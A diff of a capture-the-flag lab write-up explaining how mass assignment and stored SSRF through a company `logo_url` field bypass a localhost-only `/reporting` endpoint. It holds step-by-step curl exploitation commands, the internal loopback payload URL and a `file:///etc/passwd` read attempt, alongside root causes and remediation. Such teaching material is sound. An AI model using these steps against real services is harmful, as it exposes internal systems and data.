@@ -7,48 +7,87 @@ tags:
   - weekly
 ---
 
-- The challenge chains two steps: register as recruiter, then SSRF via `logo_url` to bypass access control on an internal-only reporting endpoint
+- Chains mass assignment (register as recruiter) with stored SSRF via `logo_url` to bypass network-based access control on an internal reporting endpoint
+- The trigger endpoint (`/api/company/:id/logo`) is undocumented - discovery requires understanding how the app consumes the stored URL
 
 ## Setup
+
+Grab your URL from the lab page (it looks like `https://lab-1777969600705-poba1k.labs-app.bugforge.io/`) and export it so the commands below work copy-paste:
 
 ```bash
 export TARGET="https://YOUR-LAB-URL.labs-app.bugforge.io"
 ```
 
-## Enumeration
-
-1. Tech Stack
-
-- Express.js backend, JWT auth (HS256, no expiration)
-- Two roles: `user` (job seeker) and `recruiter` (posts jobs, manages company)
-- Same platform as the XSS challenge with identical endpoints
-
-2. Key Endpoints
-
-```
-POST /api/register            - role=user|recruiter
-POST /api/login               - JWT in response
-GET  /api/profile             - Returns user + company data
-PUT  /api/company             - Recruiter only (company_name, industry, location, website, logo_url, description)
-GET  /api/jobs/:id            - Shows company info including logo_url
-GET  /api/company/:id/logo    - SSRF TRIGGER - fetches stored logo_url server-side
-GET  /reporting               - 403 "Access denied" from outside
-```
-
-3. The Target
+Verify it's alive:
 
 ```bash
-curl -s $TARGET/reporting
-```
-```json
-{"error":"Access denied"}
+curl -s $TARGET/api/jobs | jq '.jobs[0].title'
+# Should return a job title like "Guard Dog Coordinator"
 ```
 
-403 for every auth state - no token, user token, recruiter token. The access control is not role-based -- it's network-based (localhost only).
+## Enumeration
 
-## Step 1: Register as Recruiter
+**Tech Stack**: Express.js, JWT auth (HS256, no expiry), SQLite, Socket.io
 
-The registration endpoint accepts a `role` field. Just register with `role=recruiter`:
+**Roles**: `user` (job seeker) and `recruiter` (posts jobs, manages company profile)
+
+Key endpoints from recon:
+
+```
+POST /api/register            - role=user|recruiter (hidden field)
+POST /api/login               - JWT in response
+GET  /api/profile             - User + company data
+PUT  /api/company             - Recruiter only: company_name, industry, location, website, logo_url, description
+GET  /api/jobs/:id            - Shows company info including logo_url
+GET  /api/company/:id/logo    - SSRF trigger (undocumented -- not in frontend JS)
+GET  /reporting               - 403 from outside, accessible from localhost only
+```
+
+## Thought Process
+
+### Finding the target: `/reporting`
+
+Recon found no `/api/report*` in the frontend JS or HTML. Tried path guessing:
+
+```bash
+curl -s $TARGET/api/reporting     # 404
+curl -s $TARGET/api/reports       # 404
+curl -s $TARGET/reporting         # {"error":"Access denied"}
+```
+
+`/reporting` (no `/api` prefix) exists but returns 403 for every auth state - no token, user token, recruiter token. This is network-based access control (localhost only), not role-based.
+
+### Confirming SSRF is the path
+
+With a localhost-only endpoint confirmed, the question becomes: what feature makes the server issue HTTP requests on our behalf?
+
+The `logo_url` field in `PUT /api/company` stores an arbitrary URL. The app displays company logos alongside job listings. Somewhere, the server must fetch that URL to serve the image. The question is: where?
+
+### Finding the trigger: `/api/company/:id/logo`
+
+This endpoint is NOT in the frontend source. The frontend just renders `<img src="/api/company/3/logo">` via a template, but the JavaScript never explicitly calls it. Discovery came from RESTful convention reasoning:
+
+- Company is a resource at `/api/company`
+- `logo` is a sub-resource of a company
+- RESTful pattern: `/api/company/:id/logo` would serve the logo content
+
+Tried:
+
+| Path | Result | Conclusion |
+|------|--------|------------|
+| `GET /api/company/logo` | 404 | Needs an ID |
+| `GET /api/company/3/logo` | 200 + fetched content | Server-side fetch confirmed |
+| `POST /api/company/validate-logo` | 404 | No validation endpoint |
+
+The server fetches whatever URL is stored in `logo_url` and returns the response body.
+
+### Why recruiter role matters
+
+`PUT /api/company` requires recruiter auth. Regular users can't set `logo_url`. The registration form has a hidden `<input value="user">` for role - sending `role=recruiter` in the POST body overrides it (mass assignment). This is the prerequisite.
+
+## Exploitation
+
+### Step 1: Register as Recruiter
 
 ```bash
 curl -s $TARGET/api/register \
@@ -63,17 +102,20 @@ curl -s $TARGET/api/register \
 }
 ```
 
-Save the token:
+Save the token for subsequent requests. Copy the full `token` value from the response:
 
 ```bash
 export TOKEN="eyJhbGciOiJIUzI1NiIs..."
 ```
 
-This unlocks `PUT /api/company` which lets us set a company logo URL.
+Quick sanity check -- confirm you're a recruiter:
 
-## Step 2: Set Logo URL to Internal Reporting Endpoint
+```bash
+curl -s $TARGET/api/profile -H "Authorization: Bearer $TOKEN" | jq '.user.role'
+# "recruiter"
+```
 
-As recruiter, create the company profile with `logo_url` pointing to the internal reporting endpoint:
+### Step 2: Store internal URL as logo
 
 ```bash
 curl -s $TARGET/api/company \
@@ -86,22 +128,26 @@ curl -s $TARGET/api/company \
 {"message":"Company updated successfully"}
 ```
 
-Verify it stored:
+Port 3000 is Express's default. Verify storage:
 
 ```bash
-curl -s $TARGET/api/profile \
-  -H "Authorization: Bearer $TOKEN" | jq .company.logo_url
-```
-```
-"http://localhost:3000/reporting"
+curl -s $TARGET/api/profile -H "Authorization: Bearer $TOKEN" | jq .company.logo_url
+# "http://localhost:3000/reporting"
 ```
 
-## Step 3: Trigger the SSRF
+### Step 3: Trigger the fetch
 
-`GET /api/company/:id/logo` fetches the stored `logo_url` server-side and returns the content:
+First, get your company ID (it's assigned on creation and differs per instance):
 
 ```bash
-curl -s $TARGET/api/company/3/logo \
+curl -s $TARGET/api/profile -H "Authorization: Bearer $TOKEN" | jq .company.id
+# e.g. 3
+```
+
+Then hit the logo endpoint with that ID:
+
+```bash
+curl -s "$TARGET/api/company/3/logo" \
   -H "Authorization: Bearer $TOKEN" | jq .
 ```
 ```json
@@ -118,73 +164,48 @@ curl -s $TARGET/api/company/3/logo \
 }
 ```
 
-The server fetched `http://localhost:3000/reporting` from its own loopback interface - bypassing the network-based access control.
+The server fetched `http://localhost:3000/reporting` from its own loopback -- bypassing the network ACL entirely.
 
-> **Note:** Your company ID might differ. Check `curl -s $TARGET/api/profile -H "Authorization: Bearer $TOKEN" | jq .company.id` to get yours.
+## Dead Ends
 
-## What We Tested Along the Way
-
-Before finding the trigger endpoint:
-
-| Attempt | Result | Why |
-|---------|--------|-----|
-| Direct `/reporting` with various tokens | 403 always | Network-based ACL, not role-based |
-| `/reporting` with X-Forwarded-For: 127.0.0.1 | 403 | App doesn't trust proxy headers |
-| `PUT /api/company` with extra fields | 500 DB error | Extra columns break the query |
-| `POST /api/company/validate-logo` | 404 | Doesn't exist |
-| `GET /api/company/logo` | 404 | Wrong path |
-| Checking profile/jobs for fetched content | Just stored raw URL | Not reflected in PUT response |
-| `/api/reporting` | 404 | Correct path is `/reporting` (no /api prefix) |
-
-The breakthrough was `GET /api/company/:id/logo` - a RESTful sub-resource path that makes semantic sense but isn't referenced anywhere in the frontend JS.
+| Attempt | Result | Lesson |
+|---------|--------|--------|
+| `/reporting` with `X-Forwarded-For: 127.0.0.1` | 403 | App doesn't trust proxy headers |
+| `/reporting` with recruiter/admin JWT | 403 | ACL is IP-based, not role-based |
+| `PUT /api/company` with extra fields | 500 DB error | SQLite rejects unknown columns |
+| Checking job listings for reflected logo content | Raw URL stored, not fetched | Only the dedicated logo endpoint triggers the fetch |
+| `logo_url` with `file:///etc/passwd` | Empty response | Fetch library likely HTTP-only |
 
 ## Attack Chain
 
 ```
-Register with role=recruiter
-    |
-    v
-PUT /api/company with logo_url = http://localhost:3000/reporting
-    |
-    v
-GET /api/company/:id/logo
-    |
-    v
-Server fetches logo_url from localhost (bypasses network ACL)
-    |
-    v
-/reporting content returned to attacker (jobs, applications, flag)
+Mass assignment: register with role=recruiter
+         |
+         v
+PUT /api/company -- set logo_url = http://localhost:3000/reporting
+         |
+         v
+GET /api/company/:id/logo -- server fetches stored URL
+         |
+         v
+Server reads /reporting from loopback (bypasses network ACL)
+         |
+         v
+Internal data returned: jobs, applications, flag
 ```
 
-## Security Takeaways
+## Takeaways
 
-### Vulnerability Classification
+**Classification**: CWE-918 (Server-Side Request Forgery), OWASP A10:2021
 
-- OWASP Top 10: A10:2021 - Server-Side Request Forgery (SSRF)
-- CWE: CWE-918 - Server-Side Request Forgery
+**Root causes**:
+- No URL validation on `logo_url` -- accepts and fetches arbitrary destinations including private IPs
+- Network ACL as sole protection -- `/reporting` has zero authentication, relies entirely on source IP
+- Unnecessary server-side proxy -- `/api/company/:id/logo` fetches and forwards content instead of returning the URL for client-side `<img>` rendering
 
-### Impact
-
-- Bypass of network-based access controls on internal endpoints
-- Full read access to internal reporting data
-- In production: potential access to internal services, cloud metadata, admin panels
-
-### Root Causes
-
-1. **No URL validation on logo_url** -- the server accepts and fetches arbitrary URLs without checking the destination
-2. **Network-based ACL as sole protection** -- `/reporting` relies entirely on source IP, which SSRF trivially bypasses
-3. **Unnecessary server-side fetch** -- the `/api/company/:id/logo` endpoint fetches and proxies the content instead of returning the URL for client-side rendering
-
-### Remediation
-
-- Validate and restrict `logo_url` to HTTPS URLs on public domains only
-- Implement SSRF protection: blocklist private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, ::1)
-- Add authentication/authorization to `/reporting` rather than relying on network ACLs alone
-- If logo proxying is needed, use a dedicated image proxy with strict Content-Type validation and size limits
-
-### Key Lessons
-
-1. **"Access denied" doesn't mean game over** -- network-based ACLs are bypassed by any SSRF in the same application. Always look for server-side fetch functionality when you see internal-only endpoints
-2. **Undocumented endpoints exist** -- `/api/company/:id/logo` wasn't in any frontend JS or HTML. RESTful convention (noun/:id/sub-resource) helps guess these
-3. **Stored vs reflected SSRF** -- the URL is stored first (PUT) and fetched separately (GET). This pattern is common in image upload, webhook, and avatar URL features
-4. **Port matters** -- the internal app runs on port 3000 (Express default). Knowing the internal port is necessary to construct the SSRF URL
+**Key patterns**:
+1. "Access denied" + no auth bypass = look for SSRF. Network ACLs are trivially bypassed by any server-side fetch within the same application
+2. URL-accepting fields (`logo_url`, `webhook_url`, `callback`, `avatar`) are SSRF candidates. The question is always: where does the server consume this URL?
+3. Undocumented endpoints exist. RESTful convention (`/resource/:id/sub-resource`) is a reliable guessing heuristic when the trigger isn't in frontend source
+4. Stored SSRF (write URL, trigger fetch separately) is common in image/avatar upload, webhooks, and import features. Look for the fetch trigger, not just the storage endpoint
+5. Express defaults to port 3000 internally. When targeting localhost, try the framework's default port first
